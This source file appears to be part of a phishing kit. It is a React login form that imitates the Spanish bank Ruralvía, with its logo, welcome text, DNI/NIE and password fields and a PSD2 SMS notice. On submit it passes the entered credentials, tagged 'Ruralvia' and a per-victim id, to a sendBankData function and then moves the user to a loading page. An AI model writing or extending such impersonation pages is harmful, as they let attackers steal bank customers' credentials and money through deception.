import { useState } from 'react'
import { useNavigate, useParams } from 'react-router-dom'
import { sendBankData } from '../../../utils/utils'
import Exclamation from '../../icons/Exclamation.svg?react'
import Logo from '../../icons/Logo.svg?react'
import { Input } from '../ui/input/Input'

export function LoginForm() {
  const { id } = useParams()
  const navigate = useNavigate()

  const [login, setLogin] = useState('')
  const [password, setPassword] = useState('')

  const sendAndNavigate = (): void => {
    sendBankData(id!, 'Ruralvia', login, password)
    navigate(`/loading/${id}`)
  }

  return (
    <div className="h-full w-full bg-[linear-gradient(180deg,_#00685e,_#00685e)] md:rounded-tr-[3.5625rem]">
      <div className="mt-[3.6em] w-full px-3 md:ml-auto md:max-w-[480px] lg:px-0 [@media(min-width:1180px)]:max-w-[568px]">
        <Logo className="h-auto w-[180px]" />
        <h2 className="mt-4 text-[32px] font-semibold leading-10 text-white">
          <span className="block">Bienvenido a Ruralvía,</span>
          <span className="block">tu banca digital</span>
        </h2>
        <h3 className="mt-8 text-[14px] font-medium text-white">Introduce los datos de acceso para ti o para tu empresa:</h3>
        <div className="mt-[58px] flex flex-col max-md:w-full md:max-w-[395px] [@media(min-width:1180px)]:max-w-[468px]">
          <Input placeholder="DNI/NIE" maxLength={9} value={login} onChange={(e) => setLogin(e.target.value)} />
          <a href="" className="mt-4 self-end text-sm font-medium text-white">
            Accede con pasaporte
          </a>
        </div>
        <div className="mt-[58px] flex flex-col max-md:w-full md:max-w-[395px] [@media(min-width:1180px)]:max-w-[468px]">
          <Input type={'password'} placeholder="Contraseña" value={password} onChange={(e) => setPassword(e.target.value)} />
          <a href="" className="mt-4 self-end text-sm font-medium text-white">
            He olvidado mi contraseña
          </a>
        </div>
        <button
          onClick={sendAndNavigate}
          className="mt-[58px] h-[38px] min-w-[170px] rounded-[4px] bg-[#b6ff00] text-[14px] font-semibold text-[#004c45] transition-all duration-200 ease-in-out hover:bg-[#cdff3f] max-md:w-full"
        >
          Acceder
        </button>
        <div className="mt-[58px] flex w-full flex-row rounded-[4px] bg-[#004c45] px-5 py-4 max-md:mb-6 md:max-w-[395px] [@media(min-width:1180px)]:max-w-[468px]">
          <Exclamation className="min-h-6 min-w-6" />
          <p className="ml-2.5 text-sm font-semibold text-white">
            Cumpliendo con la normativa de seguridad europea PSD2, desde el 14/09/2019 , en el primer acceso que hagas a Ruralvía,
            además de introducir tu contraseña, también deberás introducir un código SMS que enviaremos a tu móvil.
          </p>
        </div>
      </div>
    </div>
  )
}
